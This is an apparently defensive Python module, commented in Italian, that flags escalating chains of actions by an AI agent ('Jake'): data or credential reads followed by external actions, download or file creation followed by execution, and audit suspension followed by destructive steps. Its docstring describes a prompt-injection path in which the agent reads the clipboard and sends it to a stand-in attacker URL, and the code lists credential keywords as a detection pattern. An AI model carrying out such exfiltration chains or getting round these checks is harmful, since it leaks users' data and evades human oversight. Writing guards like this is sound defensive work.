"""Rilevamento di escalation per catena di azioni (F1.5.8, fase 8/10 del piano multi-device -
decisione di prodotto esplicita dell'utente, vedi ROADMAP_EXECUTION.md sezione F1.4).

Definizione di prodotto (testuale, dalla specifica): "una sequenza di azioni costituisce
escalation quando una catena di step, presa complessivamente, produce un effetto piu' rischioso
di quello autorizzato dalla richiesta originale dell'utente".

Buco reale che questo modulo chiude, verificato leggendo `core/risk.py` PRIMA di scrivere
codice, non temuto in astratto: `needs_central_confirmation()` richiede conferma solo per
intent `DESTRUCTIVE` o superiore - un `EXTERNAL_ACTION` come `PRINT_FILE`/`OPEN_URL`/
`CONTROL_SMART_DEVICE`/`GIT_PULL` non la richiede MAI da solo, e nemmeno un `READ_ONLY` come
`CLIPBOARD_READ`/`RECALL`. Oggi un agente puo' quindi concatenare "leggi gli appunti" (READ_ONLY,
nessuna conferma) e "apri https://dominio-attaccante.example/?q=<appunti>" (EXTERNAL_ACTION,
nessuna conferma) senza incontrare ALCUN gate centrale, perche' ne' il passo di lettura ne'
quello di apertura URL superano da soli la soglia che scatena una conferma - un'iniezione (F1.5,
gia' mitigata parzialmente da `wrap_external_content`, che pero' avvisa solo il MODELLO) o
semplicemente un ragionamento sbagliato del modello potrebbero sfruttarlo.

Regole ESPLICITE per le sei combinazioni della specifica (mai una blacklist generica ne' un
punteggio euristico oscuro - "usa risk budget + alcune regole esplicite di defense-in-depth"),
ciascuna letta e giustificata contro il catalogo REALE degli intent (`core/risk.py`,
`core/action_contracts.py::INTENT_EFFECT_CLASS`, `core/taint.py::EXTERNAL_CONTENT_INTENTS`), non
ipotizzata dal nome. La sesta combinazione ("disabilitare sicurezza -> azioni privilegiate") non
ha oggi un intent che disattivi davvero una capability/il PolicyEngine (verificato: nessuna skill
tocca `policy_engine.blocked_intents`/`allowed_*`) - l'unico intent che riduce davvero una
garanzia di sicurezza ESISTENTE e' `SET_PRIVATE_MODE(enabled=True)`, che sospende la scrittura
della `ActionReceipt` nel ledger (F1.7.8): "riduci la sorveglianza, poi agisci" e' esattamente il
pattern descritto, applicato all'unico meccanismo di sorveglianza che esiste davvero da ridurre
oggi.

Deliberatamente NON affrontato qui (passo successivo dichiarato, stesso principio "prima il
meccanismo, poi l'adozione" di questa intera sessione): il collegamento vero a `TaskAgent`/
`PlanExecutor` - `TaskRiskBudget` e' un contratto/motore puro, testabile in isolamento."""
from dataclasses import dataclass, field

from core.action_contracts import EFFECT_CLASS_EXTERNAL, effect_class_of
from core.risk import RiskLevel, is_at_least, risk_of
from core.taint import EXTERNAL_CONTENT_INTENTS

# Combo 1+2 ("leggere dati privati -> inviarli fuori" e "clipboard/file/schermo -> email/
# messaggio/web upload"): `EXTERNAL_CONTENT_INTENTS` (core/taint.py, F1.5.1) copre gia' clipboard/
# file/schermo/ricerca web/cronologia browser - dati scritti da ALTRI che finiscono in Jake.
# "Dati privati" e' un insieme DIVERSO: dati dell'UTENTE gia' dentro Jake (memoria/rubrica/
# appunti) - letto ogni intent candidato uno per uno, non ipotizzato dal nome.
PRIVATE_DATA_READ_INTENTS = frozenset({"RECALL", "LIST_CONTACTS", "SEARCH_NOTES", "LIST_NOTES"})

# Combo 3 ("download -> execute"): GIT_PULL e' l'UNICO intent del catalogo che porta dentro
# contenuto da un remoto non controllato da Jake (censito in INTENT_EFFECT_CLASS come "external"
# proprio per questo) - nessun altro intent "scarica" qualcosa in questo progetto oggi.
DOWNLOAD_INTENTS = frozenset({"GIT_PULL"})

# Completamento di combo 3 e 4 ("esegui"): i due soli intent che eseguono comandi/codice
# arbitrario nel catalogo.
EXECUTE_INTENTS = frozenset({"RUN_COMMAND", "RUN_PYTHON_SCRIPT"})

# Combo 4 ("creare file/script -> execute"): intent che scrivono un NUOVO file sul disco che
# potrebbe poi essere eseguito - CREATE_PATH (un file qualsiasi, incluso uno script) e
# CREATE_SKILL (un vero .py, caricato subito come skill).
FILE_OR_SCRIPT_CREATION_INTENTS = frozenset({"CREATE_PATH", "CREATE_SKILL"})

# Combo 5 ("accesso credenziali -> trasmissione esterna"): stesso principio di redazione per NOME
# del parametro gia' usato in core/action_ledger.py (F1.7.4) - qui applicato al parametro "key"
# di RECALL per riconoscere quando il ricordo letto e' una credenziale, non un ricordo qualsiasi.
_CREDENTIAL_KEY_MARKERS = ("password", "pin", "token", "credenzial", "chiave", "secret", "segreto")

# Combo 6 ("disabilitare sicurezza -> azioni privilegiate"): vedi il docstring del modulo sul
# perche' e' questo, e non un intent che disattiva una capability (che oggi non esiste).
SECURITY_REDUCING_INTENT = "SET_PRIVATE_MODE"


def _reads_a_credential(intent: str, parameters: dict) -> bool:
    if intent != "RECALL":
        return False
    key = str((parameters or {}).get("key") or "").lower()
    return any(marker in key for marker in _CREDENTIAL_KEY_MARKERS)


def _reduces_security(intent: str, parameters: dict) -> bool:
    return intent == SECURITY_REDUCING_INTENT and bool((parameters or {}).get("enabled"))


@dataclass
class TaskRiskBudget:
    """Stato di escalation per UN task/turno. `max_authorized_risk` e' il rischio dell'intent
    ORIGINALE della richiesta dell'utente (`core.risk.risk_of()`) - un task iniziato con un
    intent READ_ONLY non autorizza implicitamente passi successivi piu' rischiosi solo perche'
    "fanno parte dello stesso turno" (oggi tenuto per completezza/audit - vedi il docstring del
    modulo sul perche' il collegamento vero a un confronto attivo resta un passo successivo)."""

    max_authorized_risk: RiskLevel
    resources_touched: set[str] = field(default_factory=set)
    external_data_seen: bool = False
    private_data_read: bool = False
    credential_accessed: bool = False
    download_occurred: bool = False
    file_or_script_created: bool = False
    security_reduced: bool = False

    def record_step(
        self, intent: str, parameters: dict | None = None, resource_keys: tuple[str, ...] = (),
    ) -> None:
        """Aggiorna lo stato osservando un passo GIA' eseguito con successo - chiamare PRIMA di
        eseguire il passo SUCCESSIVO, mai prima di eseguire questo stesso passo (l'osservazione
        riguarda un effetto avvenuto per davvero, non un tentativo)."""
        parameters = parameters or {}
        self.resources_touched.update(resource_keys)
        if intent in EXTERNAL_CONTENT_INTENTS:
            self.external_data_seen = True
        if intent in PRIVATE_DATA_READ_INTENTS:
            self.private_data_read = True
        if _reads_a_credential(intent, parameters):
            self.credential_accessed = True
        if intent in DOWNLOAD_INTENTS:
            self.download_occurred = True
        if intent in FILE_OR_SCRIPT_CREATION_INTENTS:
            self.file_or_script_created = True
        if _reduces_security(intent, parameters):
            self.security_reduced = True

    def escalation_reason(self, intent: str) -> str | None:
        """None se ESEGUIRE `intent` ADESSO non costituisce un'escalation rispetto a quanto gia'
        osservato in questo task; altrimenti una stringa breve del PERCHE' (mostrabile
        all'utente, stesso principio di `suggested_by_external_content` in `core/agent.py`).
        Controllata PRIMA di eseguire il passo, non dopo: un motivo non-None e' un segnale per
        richiedere una conferma/autenticazione FRESCA, indipendentemente da cosa deciderebbe
        `PolicyEngine` per l'intent da solo (che non conosce la STORIA del task - vedi il
        docstring del modulo sul buco reale che questo chiude)."""
        next_effect_class = effect_class_of(intent)
        if (self.external_data_seen or self.private_data_read) and next_effect_class == EFFECT_CLASS_EXTERNAL:
            return "un passo precedente ha letto contenuto esterno o dati personali: questo lo farebbe uscire da Jake"
        if self.credential_accessed and next_effect_class == EFFECT_CLASS_EXTERNAL:
            return "un passo precedente ha letto una credenziale: questo la farebbe uscire da Jake"
        if self.download_occurred and intent in EXECUTE_INTENTS:
            return "un passo precedente ha scaricato contenuto da un remoto: questo lo eseguirebbe"
        if self.file_or_script_created and intent in EXECUTE_INTENTS:
            return "un passo precedente ha creato un file/script: questo lo eseguirebbe"
        if self.security_reduced and is_at_least(risk_of(intent), RiskLevel.DESTRUCTIVE):
            return "la modalita' privata (che sospende l'audit) e' attiva: questo passo e' un'azione ad alto impatto"
        return None
